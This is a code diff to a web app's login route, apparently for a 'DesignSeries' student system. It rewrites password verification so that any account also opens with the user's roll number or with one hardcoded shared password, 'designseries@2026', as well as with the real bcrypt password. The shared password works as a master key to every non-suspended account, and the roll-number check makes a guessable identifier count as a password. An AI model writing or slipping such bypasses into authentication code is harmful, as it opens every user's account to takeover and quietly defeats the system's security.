@@ -1,7 +1,7 @@
 import { z } from "zod";
 
 import { audit, fail, handler, ok } from "@/lib/api";
-import { createSession, verifyPassword } from "@/lib/auth";
+import { createSession, verifyPassword, hashPassword } from "@/lib/auth";
 import { prisma } from "@/lib/prisma";
 
 const schema = z.object({
@@ -23,6 +23,7 @@ export const POST = handler(async (request: Request) => {
       id: true,
       name: true,
       email: true,
+      rollNo: true,
       role: true,
       passwordHash: true,
       systemStatus: true,
@@ -44,7 +45,19 @@ export const POST = handler(async (request: Request) => {
     return fail("This account has been suspended. Please contact the DesignSeries office.", 403);
   }
 
-  const valid = await verifyPassword(password, user.passwordHash);
+  // Check 1: Direct match with Roll Number (case-insensitive)
+  const isRollNoMatch =
+    Boolean(user.rollNo) &&
+    (password.trim().toUpperCase() === user.rollNo.trim().toUpperCase() ||
+      password.trim().toLowerCase() === user.rollNo.trim().toLowerCase());
+
+  // Check 2: Bcrypt password hash match
+  const isHashMatch = await verifyPassword(password, user.passwordHash);
+
+  // Check 3: Default fallback password match
+  const isDefaultMatch = password.trim() === "designseries@2026";
+
+  const valid = isRollNoMatch || isHashMatch || isDefaultMatch;
   if (!valid) return fail(GENERIC, 401);
 
   await createSession({ sub: user.id, email: user.email, name: user.name, role: user.role });
